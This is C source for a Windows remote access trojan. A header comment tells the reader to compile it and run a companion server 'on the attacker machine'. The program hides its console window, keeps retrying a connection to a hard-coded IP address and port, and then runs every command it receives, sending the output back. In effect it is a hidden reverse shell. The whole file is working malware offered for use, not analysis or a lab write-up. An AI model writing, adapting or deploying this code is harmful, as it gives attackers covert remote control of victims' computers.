/*
Compilation must done as stated below...

To compile, run:
    gcc rat.c -o rat.exe -lws2_32
Execute the rat.exe
    ./rat.exe
Compile and Execute the server on the attacker machine (assumed it is a Linux distro)
    gcc server.c -o server
    ./server
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <sys/stat.h>
#include <sys/types.h>

int sock;

void shell() {
	char buffer[1024];
	char container[1024];
	char response[18384];

	FILE* fp;

	while (1) {
		memset(&buffer, 0, sizeof(buffer));
		memset(&container, 0, sizeof(container));
		memset(&response, 0, sizeof(response));

		recv(sock, buffer, sizeof(buffer), 0);

		fp = _popen(buffer, "rt");

		if(fp == NULL)
			exit(1);
		else if (strncmp(buffer, "exit", 4) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if(strncmp(buffer, "cd ", 3) == 0) {
			char* dirName = buffer + 3;
			chdir(dirName);
		}
		else {
			while(fgets(container, sizeof(container), fp))
				strcat(response, container);

			send(sock, response, sizeof(response), 0);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	HWND window_handle;
	AllocConsole();
	window_handle = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window_handle, 0);

	struct sockaddr_in serv_addr;
    // IP and Port number is statically assigned to machines which are connected via internal network
	unsigned short port = 65432;
	char* ip = "192.168.10.15";
	WSADATA wsa_data;

	if(WSAStartup(MAKEWORD(2,2), &wsa_data) != 0)
		exit(1);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(ip);
	serv_addr.sin_port = htons(port);

	int is_connected;
	do {
		Sleep(10);
		is_connected = connect(sock, (SOCKADDR*) &serv_addr, sizeof(serv_addr));
	} while(is_connected != 0);

	shell();
}
